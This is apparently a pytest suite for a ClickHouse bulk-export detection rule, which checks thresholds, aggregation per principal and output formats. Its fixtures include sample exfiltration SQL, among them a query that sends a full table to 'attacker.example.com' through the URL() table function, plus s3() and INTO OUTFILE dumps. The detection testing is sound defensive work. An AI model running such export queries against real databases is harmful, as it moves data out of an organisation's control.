"""Tests for detect-clickhouse-bulk-export."""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from detect import (  # type: ignore[import-not-found]
    API_ACTIVITY_CLASS_UID,
    BYTE_THRESHOLD_DEFAULT,
    CLICKHOUSE_VENDOR,
    EXPORT_PATTERNS,
    FINDING_CLASS_UID,
    FINDING_TYPE_UID,
    MITRE_TECHNIQUE_UID,
    OUTPUT_FORMATS,
    OWASP_FINDING_TYPE,
    REPO_NAME,
    SEVERITY_HIGH,
    SKILL_NAME,
    WINDOW_MIN_DEFAULT,
    coverage_metadata,
    detect,
    load_jsonl,
)

THIS = Path(__file__).resolve().parent
GOLDEN = THIS / "golden"
INPUT = GOLDEN / "clickhouse_bulk_export_input.ocsf.jsonl"
EXPECTED = GOLDEN / "clickhouse_bulk_export_findings.ocsf.jsonl"


def _load(path: Path) -> list[dict]:
    return [json.loads(line) for line in path.read_text().splitlines() if line.strip()]


def _event(
    *,
    uid: str,
    time_ms: int,
    actor_uid: str = "ch_etl",
    actor_name: str = "ch_etl",
    api_operation: str = "INSERT",
    query_kind: str = "Insert",
    query: str = "INSERT INTO FUNCTION s3('https://bucket.example.com/dump.parquet', 'Parquet') SELECT * FROM events",
    read_bytes: int = 4_000_000_000,
    read_rows: int = 1_000_000,
    written_bytes: int = 4_000_000_000,
    written_rows: int = 1_000_000,
    exception: str = "",
    vendor: str = "ClickHouse",
    status_id: int = 1,
) -> dict:
    return {
        "activity_id": 1,
        "category_uid": 6,
        "category_name": "Application Activity",
        "class_uid": API_ACTIVITY_CLASS_UID,
        "class_name": "API Activity",
        "type_uid": API_ACTIVITY_CLASS_UID * 100 + 1,
        "severity_id": 1,
        "status_id": status_id,
        "time": time_ms,
        "metadata": {
            "version": "1.8.0",
            "uid": uid,
            "product": {
                "name": REPO_NAME,
                "vendor_name": vendor,
                "feature": {"name": "ingest-clickhouse-query-log-ocsf"},
            },
        },
        "actor": {"user": {"uid": actor_uid, "name": actor_name, "type": "Service"}},
        "api": {"operation": api_operation, "service": {"name": "clickhouse.cluster"}},
        "src_endpoint": {"ip": "203.0.113.42"},
        "unmapped": {
            "clickhouse": {
                "query_kind": query_kind,
                "query": query,
                "read_bytes": read_bytes,
                "read_rows": read_rows,
                "written_bytes": written_bytes,
                "written_rows": written_rows,
                "exception": exception,
            }
        },
    }


class TestDetection:
    def test_three_export_queries_over_byte_threshold_fires_once(self) -> None:
        events = [
            _event(
                uid="q-1",
                time_ms=1_000,
                query="INSERT INTO FUNCTION s3('https://a.example.com/p1.parquet','Parquet') SELECT * FROM events",
                read_bytes=4_000_000_000,
            ),
            _event(
                uid="q-2",
                time_ms=2_000,
                query="SELECT * FROM events INTO OUTFILE '/tmp/dump.tsv' FORMAT TabSeparated",
                api_operation="SELECT",
                query_kind="Select",
                read_bytes=4_000_000_000,
            ),
            _event(
                uid="q-3",
                time_ms=3_000,
                query="INSERT INTO TABLE FUNCTION URL('https://attacker.example.com/sink','JSONEachRow') SELECT * FROM events",
                read_bytes=4_000_000_000,
            ),
        ]
        findings = list(detect(events))
        assert len(findings) == 1
        finding = findings[0]
        assert finding["class_uid"] == FINDING_CLASS_UID == 2004
        assert finding["type_uid"] == FINDING_TYPE_UID
        assert finding["severity_id"] == SEVERITY_HIGH
        assert finding["metadata"]["product"]["feature"]["name"] == SKILL_NAME
        assert finding["metadata"]["uid"] == finding["finding_info"]["uid"]
        assert finding["finding_info"]["attacks"][0]["technique"]["uid"] == MITRE_TECHNIQUE_UID
        assert OWASP_FINDING_TYPE in finding["finding_info"]["types"]
        assert finding["evidence"]["events_observed"] == 3
        assert finding["evidence"]["read_bytes"] == 12_000_000_000
        # Distinct destinations parsed out of the SQL text.
        assert len(finding["evidence"]["export_targets"]) == 3

    def test_failed_query_is_skipped(self) -> None:
        # Even a huge `read_bytes` doesn't fire if the query errored — no
        # rows actually left the cluster.
        events = [
            _event(
                uid="q-1",
                time_ms=1_000,
                read_bytes=BYTE_THRESHOLD_DEFAULT * 2,
                exception="DB::Exception: Memory limit exceeded",
            ),
        ]
        assert list(detect(events)) == []

    def test_single_non_export_select_does_not_fire(self) -> None:
        # A plain SELECT that isn't an export pattern stays out of scope, even
        # if the volume is huge — it's a normal warehouse read.
        events = [
            _event(
                uid="q-1",
                time_ms=1_000,
                api_operation="SELECT",
                query_kind="Select",
                query="SELECT count() FROM events WHERE event_date >= today() - 30",
                read_bytes=BYTE_THRESHOLD_DEFAULT * 2,
            ),
        ]
        assert list(detect(events)) == []

    def test_multi_statement_aggregate_into_one_finding(self) -> None:
        # Five smaller export queries, none individually crossing the
        # threshold, aggregate into a single (principal, window) finding.
        events = [
            _event(
                uid=f"q-{i}",
                time_ms=1_000 + i,
                query=f"SELECT * FROM events INTO OUTFILE '/tmp/dump-{i}.tsv'",
                api_operation="SELECT",
                query_kind="Select",
                read_bytes=2_500_000_000,
                read_rows=500_000,
            )
            for i in range(5)
        ]
        findings = list(detect(events))
        assert len(findings) == 1
        assert findings[0]["evidence"]["events_observed"] == 5
        assert findings[0]["evidence"]["read_bytes"] == 5 * 2_500_000_000

    def test_non_clickhouse_vendor_is_ignored(self) -> None:
        events = [
            _event(uid="q-1", time_ms=1_000, vendor="Snowflake"),
            _event(uid="q-2", time_ms=2_000, vendor="Snowflake"),
            _event(uid="q-3", time_ms=3_000, vendor="Snowflake"),
        ]
        assert list(detect(events)) == []

    def test_two_principals_each_fire_separately(self) -> None:
        events = [
            _event(uid="a-1", time_ms=1_000, actor_uid="alice", read_bytes=6_000_000_000),
            _event(uid="b-1", time_ms=1_500, actor_uid="bob", read_bytes=6_000_000_000),
            _event(uid="a-2", time_ms=2_000, actor_uid="alice", read_bytes=6_000_000_000),
            _event(uid="b-2", time_ms=2_500, actor_uid="bob", read_bytes=6_000_000_000),
        ]
        findings = list(detect(events))
        assert len(findings) == 2
        principals = {f["observables"][0]["value"] for f in findings}
        assert principals == {"alice", "bob"}

    def test_native_output_format(self) -> None:
        events = [
            _event(uid="q-1", time_ms=1_000, read_bytes=6_000_000_000),
            _event(uid="q-2", time_ms=2_000, read_bytes=6_000_000_000),
        ]
        findings = list(detect(events, output_format="native"))
        assert OUTPUT_FORMATS == ("ocsf", "native")
        assert len(findings) == 1
        finding = findings[0]
        assert finding["schema_mode"] == "native"
        assert finding["record_type"] == "detection_finding"
        assert finding["provider"] == "ClickHouse"
        assert "class_uid" not in finding

    def test_rejects_unsupported_output_format(self) -> None:
        from skills._shared.errors import ContractError

        try:
            list(detect([], output_format="parquet"))
        except ContractError as exc:
            assert "unsupported output_format" in str(exc)
            assert exc.error_class == "contract"
            assert exc.retryable is False
        else:
            raise AssertionError("expected unsupported output_format to raise")

    def test_golden_fixture_matches(self) -> None:
        findings = list(detect(_load(INPUT)))
        assert findings == _load(EXPECTED)


class TestThresholdOverrides:
    def test_byte_threshold_env_override(self, monkeypatch) -> None:
        events = [
            _event(uid="q-1", time_ms=1_000, read_bytes=10),
            _event(uid="q-2", time_ms=2_000, read_bytes=10),
        ]
        # default threshold (10 GiB): no fire
        assert list(detect(events)) == []
        # lower it so the burst above crosses
        monkeypatch.setenv("CLICKHOUSE_EXPORT_BYTE_THRESHOLD", "15")
        assert len(list(detect(events))) == 1


class TestMetadata:
    def test_coverage_metadata(self) -> None:
        metadata = coverage_metadata()
        assert metadata["providers"] == ("clickhouse",)
        assert metadata["thresholds"]["window_minutes"] == WINDOW_MIN_DEFAULT
        assert metadata["thresholds"]["byte_threshold"] == BYTE_THRESHOLD_DEFAULT
        assert "INTO OUTFILE" in EXPORT_PATTERNS
        assert "URL(" in EXPORT_PATTERNS
        assert CLICKHOUSE_VENDOR == "ClickHouse"


class TestLoadJsonl:
    def test_skips_malformed(self, capsys) -> None:
        out = list(load_jsonl(['{"bad": ', '{"class_uid": 6003}']))
        assert out == [{"class_uid": 6003}]
        assert "skipping line 1" in capsys.readouterr().err

    def test_emits_json_stderr_telemetry_when_enabled(self, capsys, monkeypatch) -> None:
        monkeypatch.setenv("SKILL_LOG_FORMAT", "json")
        list(load_jsonl(['{"bad": ']))
        payload = json.loads(capsys.readouterr().err.strip())
        assert payload["skill"] == SKILL_NAME
        assert payload["level"] == "warning"
        assert payload["event"] == "json_parse_failed"
        assert payload["line"] == 1
